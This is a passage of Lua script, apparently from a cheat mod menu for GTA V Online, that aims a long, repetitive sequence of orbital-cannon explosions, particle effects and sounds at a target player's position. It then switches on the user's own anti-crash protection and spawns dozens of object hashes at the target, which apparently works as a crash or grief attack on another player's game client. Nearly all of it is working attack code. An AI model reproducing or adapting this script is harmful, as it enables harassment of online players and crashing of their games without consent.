				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				menu.trigger_commands("anticrashcamera")
				util.yield(550)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				for i = 1, 1 do  
                    FIRE.ADD_EXPLOSION(pos.x +0, pos.y +65.5, pos.z +10.0, 82, 10, true, false, 1, false)
					give_object1(pid, 2087304222)
					give_object1(pid, 1193759130)
					give_object1(pid, 1964400974)
					give_object1(pid, -8033527)
					give_object1(pid, -310622473)
					give_object1(pid, -500649904)
					give_object1(pid, -781152544)
					give_object1(pid, 1536155685)
					give_object1(pid, -1086368107)
					give_object1(pid, 430311693)
					give_object1(pid, 2053587267)
					give_object1(pid, -1584097999)
					give_object1(pid, -421266630)
					give_object1(pid, -652583001)
					give_object1(pid, 1842258647)
					give_object1(pid, -1409359059)
					give_object1(pid, 79058805)
					give_object1(pid, 1165195353)
					give_object1(pid, -1133354853)
					give_object1(pid, -1515174995)
					give_object1(pid, -1023683840)
					give_object1(pid, -1742955463)
					give_object1(pid, 1659646421)
					give_object1(pid, -1266592510)
					give_object1(pid, -540782362)
					give_object1(pid, 635240170)
					give_object1(pid, -724492621)
					give_object1(pid, -999719436)
					give_object1(pid, -2002254222)
					give_object1(pid, 2139601616)
					give_object1(pid, 1075432268)
					give_object1(pid, -498054846)
					give_object1(pid, -1214293858)
					give_object1(pid, -1566741232)
					give_object1(pid, 1938265576)
					give_object1(pid, 1581459400)
